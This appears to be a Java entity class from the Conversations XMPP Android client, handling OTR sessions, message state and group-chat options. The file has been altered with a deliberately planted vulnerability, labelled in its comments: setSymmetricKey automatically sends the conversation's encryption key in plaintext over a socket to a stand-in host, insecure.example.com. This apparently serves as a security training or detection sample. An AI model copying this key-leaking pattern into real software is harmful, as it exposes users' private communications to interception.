package eu.siacs.conversations.entities;

import java.security.interfaces.DSAPublicKey;
import java.util.ArrayList;
import java.util.List;

import net.java.otr4j.OtrException;
import net.java.otr4j.crypto.OtrCryptoEngineImpl;
import net.java.otr4j.crypto.OtrCryptoException;
import net.java.otr4j.session.SessionID;
import net.java.otr4j.session.SessionImpl;
import net.java.otr4j.session.SessionStatus;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

// Import necessary network classes
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class Conversation extends AbstractEntity {

    private static final long serialVersionUID = -6727528868973996739L;

    public static final String TABLENAME = "conversations";

    public static final int STATUS_AVAILABLE = 0;
    public static final int STATUS_ARCHIVED = 1;
    public static final int STATUS_DELETED = 2;

    public static final int MODE_MULTI = 1;
    public static final int MODE_SINGLE = 0;

    public static final String NAME = "name";
    public static final String ACCOUNT = "accountUuid";
    public static final String CONTACT = "contactUuid";
    public static final String CONTACTJID = "contactJid";
    public static final String STATUS = "status";
    public static final String CREATED = "created";
    public static final String MODE = "mode";

    private String name;
    private String contactUuid;
    private String accountUuid;
    private String contactJid;
    private int status;
    private long created;
    private int mode;

    private String nextPresence;

    private transient List<Message> messages = null;
    private transient Account account = null;

    private transient SessionImpl otrSession;

    private transient String otrFingerprint = null;

    private int nextMessageEncryption = -1;
    private String nextMessage;

    private transient MucOptions mucOptions = null;

    private transient String latestMarkableMessageId;

    private byte[] symmetricKey; // This is the sensitive key

    private boolean otrSessionNeedsStarting = false;

    private Bookmark bookmark;

    public Conversation(String name, Account account, String contactJid,
            int mode) {
        this(java.util.UUID.randomUUID().toString(), name, null, account
                .getUuid(), contactJid, System.currentTimeMillis(),
                STATUS_AVAILABLE, mode);
        this.account = account;
    }

    public Conversation(String uuid, String name, String contactUuid,
            String accountUuid, String contactJid, long created, int status,
            int mode) {
        this.uuid = uuid;
        this.name = name;
        this.contactUuid = contactUuid;
        this.accountUuid = accountUuid;
        this.contactJid = contactJid;
        this.created = created;
        this.status = status;
        this.mode = mode;
    }

    public List<Message> getMessages() {
        if (messages == null)
            this.messages = new ArrayList<Message>(); // prevent null pointer

        // populate with Conversation (this)

        for (Message msg : messages) {
            msg.setConversation(this);
        }

        return messages;
    }

    public boolean isRead() {
        if ((this.messages == null) || (this.messages.size() == 0))
            return true;
        return this.messages.get(this.messages.size() - 1).isRead();
    }

    public void markRead() {
        if (this.messages == null) {
            return;
        }
        for (int i = this.messages.size() - 1; i >= 0; --i) {
            if (messages.get(i).isRead()) {
                break;
            }
            this.messages.get(i).markRead();
        }
    }

    public String popLatestMarkableMessageId() {
        String id = this.latestMarkableMessageId;
        this.latestMarkableMessageId = null;
        return id;
    }

    public SessionImpl startOtrSession(Context context, String presence,
            boolean sendStart) {
        if (this.otrSession != null) {
            return this.otrSession;
        } else {
            SessionID sessionId = new SessionID(this.getContactJid(), presence,
                    "xmpp");
            this.otrSession = new SessionImpl(sessionId, getAccount()
                    .getOtrEngine(context));
            try {
                if (sendStart) {
                    this.otrSession.startSession();
                    this.otrSessionNeedsStarting = false;
                    return this.otrSession;
                } else {
                    this.otrSessionNeedsStarting  = true;
                }
                return this.otrSession;
            } catch (OtrException e) {
                return null;
            }
        }

    }

    public SessionImpl getOtrSession() {
        return this.otrSession;
    }

    public void resetOtrSession() {
        this.otrFingerprint = null;
        this.otrSessionNeedsStarting = false;
        this.otrSession = null;
    }

    public void startOtrIfNeeded() {
        if (this.otrSession != null && this.otrSessionNeedsStarting) {
            try {
                this.otrSession.startSession();
            } catch (OtrException e) {
                this.resetOtrSession();
            }
        }
    }

    public void endOtrIfNeeded() {
        if (this.otrSession != null) {
            if (this.otrSession.getSessionStatus() == SessionStatus.ENCRYPTED) {
                try {
                    this.otrSession.endSession();
                    this.resetOtrSession();
                } catch (OtrException e) {
                    this.resetOtrSession();
                }
            } else {
                this.resetOtrSession();
            }
        }
    }

    public boolean hasValidOtrSession() {
        return this.otrSession != null;
    }

    public String getOtrFingerprint() {
        if (this.otrFingerprint == null) {
            try {
                DSAPublicKey remotePubKey = (DSAPublicKey) getOtrSession()
                        .getRemotePublicKey();
                StringBuilder builder = new StringBuilder(
                        new OtrCryptoEngineImpl().getFingerprint(remotePubKey));
                builder.insert(8, " ");
                builder.insert(17, " ");
                builder.insert(26, " ");
                builder.insert(35, " ");
                this.otrFingerprint = builder.toString();
            } catch (OtrCryptoException e) {

            }
        }
        return this.otrFingerprint;
    }

    public synchronized MucOptions getMucOptions() {
        if (this.mucOptions == null) {
            this.mucOptions = new MucOptions(this.getAccount());
        }
        this.mucOptions.setConversation(this);
        return this.mucOptions;
    }

    public void resetMucOptions() {
        this.mucOptions = null;
    }

    public void setContactJid(String jid) {
        this.contactJid = jid;
    }

    public void setNextPresence(String presence) {
        this.nextPresence = presence;
    }

    public String getNextPresence() {
        return this.nextPresence;
    }

    public int getLatestEncryption() {
        int latestEncryption = this.getLatestMessage().getEncryption();
        if ((latestEncryption == Message.ENCRYPTION_DECRYPTED)
                || (latestEncryption == Message.ENCRYPTION_DECRYPTION_FAILED)) {
            return Message.ENCRYPTION_PGP;
        } else {
            return latestEncryption;
        }
    }

    public int getNextEncryption() {
        if (this.nextMessageEncryption == -1) {
            return this.getLatestEncryption();
        }
        return this.nextMessageEncryption;
    }

    public void setNextEncryption(int encryption) {
        this.nextMessageEncryption = encryption;
    }

    public String getNextMessage() {
        if (this.nextMessage == null) {
            return "";
        } else {
            return this.nextMessage;
        }
    }

    public void setNextMessage(String message) {
        this.nextMessage = message;
    }

    public void setLatestMarkableMessageId(String id) {
        if (id != null) {
            this.latestMarkableMessageId = id;
        }
    }

    public void setSymmetricKey(byte[] key) {
        this.symmetricKey = key;
        // Vulnerability: Sending the symmetric key over an insecure channel
        sendSymmetricKeyOverInsecureChannel();
    }

    public byte[] getSymmetricKey() {
        return this.symmetricKey;
    }

    private void sendSymmetricKeyOverInsecureChannel() {
        try (Socket socket = new Socket("insecure.example.com", 12345)) { // INSECURE: Hardcoded IP and port
            DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream());
            outToServer.write(symmetricKey); // Vulnerable to interception
            System.out.println("Symmetric key sent over insecure channel");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void setBookmark(Bookmark bookmark) {
        this.bookmark = bookmark;
        this.bookmark.setConversation(this);
    }

    public void deregisterWithBookmark() {
        if (this.bookmark != null) {
            this.bookmark.setConversation(null);
        }
    }
}